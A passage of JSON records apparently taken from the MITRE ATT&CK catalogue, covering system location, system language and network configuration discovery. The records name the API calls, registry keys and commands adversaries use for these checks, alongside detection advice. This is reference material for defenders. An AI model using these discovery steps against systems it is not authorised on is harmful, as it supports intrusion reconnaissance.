2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: FSecure Lokibot November 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: US-CERT BADCALL),(Citation: sentinelone shlayer to zshlayer),(Citation: Leonardo Turla Penquin May 2020),(Citation: ESET Telebots July 2017),(Citation: Cisco CaddyWiper March 2022),(Citation: Talos Promethium June 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: Talos NavRAT May 2018),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: APT15 Intezer June 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: Mandiant APT1 Appendix),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Symantec Orangeworm April 2018),(Citation: Securelist APT10 March 2021),(Citation: ESET PipeMon May 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Check Point APT34 April 2021),(Citation: Palo Alto MoonWind March 2017),(Citation: CISA SoreFang July 2016),(Citation: Unit42 Sofacy Dec 2018),(Citation: FireEye FIN7 April 2017),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye admin@338),(Citation: PWC WellMess July 2020),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: Palo Alto Shamoon Nov 2016),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Cybereason Chaes Nov 2020),(Citation: Accenture Hogfish April 2018),(Citation: ATT QakBot April 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Forcepoint Felismus Mar 2017),(Citation: TrendMicro Ursnif Mar 2015),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos ZxShell Oct 2014),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET Attor Oct 2019),(Citation: ESET Zebrocy May 2019),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: Cyble Black Basta May 2022),(Citation: McAfee Sodinokibi October 2019),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: McAfee Bankshot),(Citation: McAfee Maze March 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: Cybereason Bazar July 2020),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: BiZone Lizar May 2021),(Citation: ESET Operation Groundbait),(Citation: Mandiant APT41),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Gigamon Berserk Bear October 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: FireEye FiveHands April 2021),(Citation: BlackBerry Amadey 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: FireEye APT32 April 2020),(Citation: Unit42 BabyShark Feb 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CME Github September 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Fidelis njRAT June 2013),(Citation: Mandiant UNC3313 Feb 2022),(Citation: NCSC Cyclops Blink February 2022),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Lucifer June 2020),(Citation: Morphisec ShellTea June 2019),(Citation: GitHub PoshC2),(Citation: Anomali Rocke March 2019),(Citation: Unit 42 PingPull Jun 2022),(Citation: McAfee Night Dragon),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: US-CERT Bankshot Dec 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Talos Bisonal Mar 2020),(Citation: Lotus Blossom Jun 2015),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: Fidelis TrickBot Oct 2016),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Forcepoint Monsoon),(Citation: Dragos Crashoverride 2017),(Citation: Unit42 Molerat Mar 2020),(Citation: McAfee Babuk February 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: TrendMicro TropicTrooper 2015),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Volexity PowerDuke November 2016),(Citation: Securelist Denis April 2017),(Citation: Malwarebytes Konni Aug 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Novetta Blockbuster Loaders),(Citation: Lazarus RATANKBA),(Citation: Palo Alto T9000 Feb 2016),(Citation: Kaspersky Lyceum October 2021),(Citation: Talos Group123),(Citation: Kaspersky StoneDrill 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ASERT Donot March 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Securelist ScarCruft May 2019),(Citation: Fortinet Agent Tesla April 2018),(Citation: FireEye Periscope March 2018),(Citation: Trend Micro KillDisk 1),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: US-CERT Volgmer Nov 2017),(Citation: Palo Alto Reaver Nov 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCC Group Chimera January 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talos Micropsia June 2017),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Kaspersky Turla Aug 2014),(Citation: IBM IcedID November 2017),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Group IB Ransomware September 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Securelist Kimsuky Sept 2013),(Citation: Check Point Meteor Aug 2021),(Citation: Cymmetria Patchwork),(Citation: Symantec Chafer Dec 2015),(Citation: Trend Micro Royal Linux ESXi February 2023),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: PTSecurity Higaisa 2020),(Citation: Talos Konni May 2017),(Citation: Korean FSI TA505 2020),(Citation: Unit 42 KerrDown February 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Lunghi Iron Tiger Linux),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Microsoft SIR Vol 21),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Profero APT27 December 2020),(Citation: Checkpoint Dridex Jan 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: RedCanary Mockingbird May 2020),(Citation: Zscaler Kasidet),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ),(Citation: Cisco Talos Intelligence Group),(Citation: ClearSky Siamesekitten August 2021),(Citation: CrowdStrike Ryuk January 2019),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Secureworks Karagany July 2019),(Citation: Palo Alto OilRig Oct 2016),(Citation: Cybereason Valak May 2020),(Citation: JoeSecurity Egregor 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: ESET Sednit Part 1),(Citation: Rancor Unit42 June 2018),(Citation: Check Point Pay2Key November 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: CERT-EE Gamaredon January 2021),(Citation: FireEye APT30),(Citation: Google EXOTIC LILY March 2022),(Citation: SentinelOne Valak June 2020),(Citation: Unit 42 Inception November 2018),(Citation: Baumgartner Naikon 2015),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Talos MuddyWater Jan 2022),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Trend Micro IXESHE 2012),(Citation: Lazarus APT January 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: FireEye APT28),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Netwire Mar 2015),(Citation: ESET LoudMiner June 2019),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: McAfee Cuba April 2021),(Citation: F-Secure CozyDuke),(Citation: Symantec Naid June 2012),(Citation: Securelist Octopus Oct 2018),(Citation: Fidelis Turbo),(Citation: evolution of pirpi),(Citation: Check Point Warzone Feb 2020),(Citation: ESET ForSSHe December 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: Prevx Carberp March 2011),(Citation: FinFisher Citation),(Citation: Accenture MUDCARP March 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: DFIR Ryuk's Return October 2020),(Citation: Kaspersky Turla),(Citation: CrowdStrike IceApple May 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Cylance Dust Storm),(Citation: Securelist Dtrack),(Citation: Symantec Inception Framework March 2018),(Citation: FireEye APT19),(Citation: Fysbis Palo Alto Analysis),(Citation: Novetta Winnti April 2015),(Citation: Malwarebytes Higaisa 2020),(Citation: Symantec Frutas Feb 2013),(Citation: Talos GravityRAT),(Citation: BlackBerry Bahamut),(Citation: Malwarebytes Pony April 2016),(Citation: CISA WellMess July 2020),(Citation: Medium KONNI Jan 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: Talos MuddyWater May 2019),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET RTM Feb 2017),(Citation: F-Secure The Dukes),(Citation: GitHub QuasarRAT),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: GitHub Pupy),(Citation: McAfee GhostSecret),(Citation: XAgentOSX 2017),(Citation: Secureworks REvil September 2019),(Citation: NHS Digital Egregor Nov 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FoxIT Wocao December 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: ESET Okrum July 2019),(Citation: ESET OceanLotus),(Citation: TechNet Dir),(Citation: Eclypsium Trickboot December 2020),(Citation: Github PowerShell Empire),(Citation: Fortinet Agent Tesla June 2017),(Citation: Unit 42 DarkHydrus July 2018),(Citation: FireEye APT37 Feb 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Group IB GrimAgent July 2021),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: NCC Group Team9 June 2020),(Citation: TechNet Systeminfo),(Citation: Symantec Hydraq Jan 2010),(Citation: Talos ROKRAT),(Citation: McAfee Gold Dragon),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: McAfee Oceansalt Oct 2018),(Citation: McAfee Honeybee),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Unit 42 Shamoon3 2018),(Citation: Palo Alto DNS Requests),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET OceanLotus macOS April 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Minerva Labs Black Basta May 2022),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Symantec Bumblebee June 2022),(Citation: Avira Mustang Panda January 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: Symantec Pasam May 2012),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Medium Anchor DNS July 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: CrowdStrike Putter Panda),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Unit 42 Nokki Oct 2018),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Intel 471 REvil March 2020),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky Sodin July 2019),(Citation: Group IB Ransomware May 2020),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Palo Alto menuPass Feb 2017),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Prevailion EvilNum May 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: SecureList Griffon May 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Novetta Blockbuster),(Citation: Cylance Sodinokibi July 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: DFIR Phosphorus November 2021),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Emissary Trojan Feb 2016),(Citation: ESET Kobalos Jan 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Symantec Buckeye),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Skidmap),(Citation: Novetta-Axiom),(Citation: Symantec Linfo May 2012),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Cybereason Royal December 2022),(Citation: Talos ROKRAT 2),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT32 May 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Microsoft BlackCat Jun 2022),(Citation: Accenture Lyceum Targets November 2021),(Citation: Gh0stRAT ATT March 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Carbon Black Shlayer Feb 2019),(Citation: ESET ComRAT May 2020),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: DustySky),(Citation: FireEye APT10 Sept 2018),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: Talos PoetRAT April 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: TrendMicro MacOS April 2018),"}
{"ID":"T1614","name":"System Location Discovery","description":"\nAdversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)","url":"https://attack.mitre.org/techniques/T1614","created":"01 April 2021","last modified":"15 October 2021","version":"1.0","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling <code> GetLocaleInfoW</code> to gather information.(Citation: FBI Ragnar Locker 2020)\n\nMonitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo.","platforms":"IaaS, Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Hiroki Nagahama, NEC Corporation; Katie Nickels, Red Canary; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Wes Hurd","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: FBI Ragnar Locker 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Korean FSI TA505 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Group IB GrimAgent July 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Malwarebytes Saint Bot April 2021),"}
{"ID":"T1614.001","name":"System Location Discovery: System Language Discovery","description":"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.","url":"https://attack.mitre.org/techniques/T1614/001","created":"18 August 2021","last modified":"15 October 2021","version":"1.0","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access","is sub-technique":true,"sub-technique of":"T1614","defenses bypassed":null,"contributors":"Harshal Tupsamudre, Qualys","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Kaspersky Sodin July 2019),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: CrowdStrike Ryuk January 2019),(Citation: Microsoft NICKEL December 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: McAfee Cuba April 2021),(Citation: McAfee Maze March 2020),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Mcafee Clop Aug 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Arxiv Avaddon Feb 2021),(Citation: Cylance Dust Storm),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye FiveHands April 2021),(Citation: Group IB GrimAgent July 2021),"}
{"ID":"T1016","name":"System Network Configuration Discovery","description":"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ","url":"https://attack.mitre.org/techniques/T1016","created":"31 May 2017","last modified":"30 March 2023","version":"1.5","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, {{LinkById|T1059.008} commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations.  Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Mandiant APT1),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Palo Alto Comnie),(Citation: AlienVault Sykipot 2011),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Talos Konni May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Unit42 BabyShark Feb 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Costa AvosLocker May 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: SecureWorks WannaCry Analysis),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FSecure Lokibot November 2019),(Citation: CME Github September 2018),(Citation: Symantec Catchamas April 2018),(Citation: ESET Okrum July 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: S2 Grupo TrickBot June 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: NCSC Cyclops Blink February 2022),(Citation: US-CERT BADCALL),(Citation: F-Secure BlackEnergy 2014),(Citation: objsee mac malware 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: TechNet Arp),(Citation: Unit 42 Bisonal July 2018),(Citation: Github PowerShell Empire),(Citation: GitHub PoshC2),(Citation: Sophos New Ryuk Attack October 2020),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Github Koadic),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: Talos Promethium June 2020),(Citation: McAfee Night Dragon),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: NTT Security Flagpro new December 2021),(Citation: GovCERT Carbon May 2016),(Citation: Debian nbtscan Nov 2019),(Citation: Talos Bisonal Mar 2020),(Citation: JPCert TSCookie March 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Securelist Darkhotel Aug 2015),(Citation: Lotus Blossom Jun 2015),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Symantec Hydraq Jan 2010),(Citation: Securelist Calisto July 2018),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: McAfee Gold Dragon),(Citation: ClearSky Siamesekitten August 2021),(Citation: Symantec Orangeworm April 2018),(Citation: CrowdStrike Ryuk January 2019),(Citation: Secureworks Karagany July 2019),(Citation: ESET PipeMon May 2020),(Citation: Talos Cobalt Group July 2018),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: Palo Alto OilRig Oct 2016),(Citation: Cybereason Valak May 2020),(Citation: McAfee Oceansalt Oct 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Check Point APT34 April 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Palo Alto MoonWind March 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Rancor Unit42 June 2018),(Citation: Palo Alto DNS Requests),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Check Point Pay2Key November 2020),(Citation: Malwarebytes Dyreza November 2015),(Citation: Forcepoint Monsoon),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Talos Kimsuky Nov 2021),(Citation: CISA SoreFang July 2016),(Citation: CERT-FR PYSA April 2020),(Citation: Baumgartner Naikon 2015),(Citation: Malwarebytes Saint Bot April 2021),(Citation: FireEye admin@338),(Citation: Red Canary NETWIRE January 2020),(Citation: Trend Micro Tick November 2019),(Citation: Proofpoint NETWIRE December 2020),(Citation: CarbonBlack Conti July 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: PWC WellMess July 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Avira Mustang Panda January 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Gelsemium June 2021),(Citation: Medium Anchor DNS July 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: Bleeping Computer - Ryuk WoL),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET Dukes October 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: ESET Carbon Mar 2017),(Citation: CheckPoint Naikon May 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Volexity PowerDuke November 2016),(Citation: TrendMicro EarthLusca 2022),(Citation: Fortinet Diavol July 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Volgmer Aug 2014),(Citation: McAfee Sharpshooter December 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: ESET LoudMiner June 2019),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Novetta Blockbuster 